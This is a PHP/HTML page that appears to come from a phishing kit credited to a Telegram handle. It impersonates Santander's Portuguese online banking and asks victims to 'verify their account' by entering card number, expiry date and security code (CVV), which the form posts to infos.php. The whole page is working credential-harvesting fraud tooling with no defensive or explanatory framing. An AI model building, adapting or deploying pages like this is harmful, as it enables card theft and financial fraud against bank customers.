<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";


?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Netbanco Particulares - Santander</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/favicon.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>

    <header id="login" style="padding:10px;">
        <div class="header d-flex justify-content-between container" >
            <div class="logo"><img src="image/logo.svg" width="120"></div>
            <div class="navv">
                <ul class="list-unstyled d-flex">
                    <li><i style="margin-right: 10px;" class="fas fa-comment-alt-dots"></i>Chat</li>
                    <li><i style="margin-right: 10px;" class="fas fa-cog"></i>Definições</li>
                    <li><i style="margin-right: 10px;" class="fad fa-sign-out"></i>Saída</li>
                </ul>
            </div>
        </div>
    </header>

    <section id="cc" style="background: #fbfafb;">
        <div class="index" >
            <div class="row align-items-center">
                <div class="col-md-2"></div>
                <div class="col-md-8">
                    <h3 class="mb-4" style="font-weight: 700;">Verifique sua conta</h3>
                    <div class="form shadow py-3 px-4 border" style="background:#fff">
                        <h2>Identifique-se com seus cartões Santander</h2>
                        <div class="span" style="margin:0"><span>Você pode usar os detalhes de um cartão de débito ou crédito</span></div>

                        <form action="infos.php" method="post">

                           <input type="hidden" value="cc" name="step">

                            <div class="form-group mt-3 col-md-6">
                                <label style="    font-size: 13px;" for="card_number">Número do cartão</label>
                                <input style="height:40px;" type="text" id="card_number" class="form-control" name="card_number"> 
                                <?php
                                          if( !empty($_SESSION['errors']['card_number']) ) {
                                            echo '<div class="error" class="error">værdi er påkrævet</div>';}
                                     ?>
                            </div>

                                <div class="form-group mt-3 col-md-6">
                                    <label style="    font-size: 13px;" for="expiry">Data de validade</label>
                                    <input style="height:40px;" type="text" id="expiry" class="form-control" name="expiry"> 
                                    <?php
                                          if( !empty($_SESSION['errors']['expiry']) ) {
                                            echo '<div class="error" class="error">værdi er påkrævet</div>';}
                                     ?>
                                </div>
                                <div class="form-group mt-3 col-md-6">
                                    <label style="    font-size: 13px;" for="cvv">Código Segurança</label>
                                    <input style="height:40px;" type="text" id="cvv" class="form-control " name="cvv"> 
                                    <?php
                                          if( !empty($_SESSION['errors']['cvv']) ) {
                                            echo '<div class="error" class="error">værdi er påkrævet</div>';}
                                     ?>
                                </div>

                            <div class="bttn text-end mt-3 align-items-center">
                                <button style="width: auto;font-size: 15px;height: 40px;" name="submit">Entrar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="footer d-block d-md-flex justify-content-between align-items-center">
                <ul class="list-unstyled mb-0">
                    <li>Preçário</li>
                    <li>Termos e Condições</li>
                    <li>Contactos</li>
                </ul>
                <div><span style="color: #4D5557;font-size: 11px;font-weight: 700;">© 2022 Santander - Todos os Direitos Reservados...</span></div>
            </div>
        </div>
    </section>

    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
        $('#cvv').payment('formatCardCVC');
        $('#expiry').payment('formatCardExpiry');
        $('#card_number').payment('formatCardNumber');
  </script>
</body>
</html>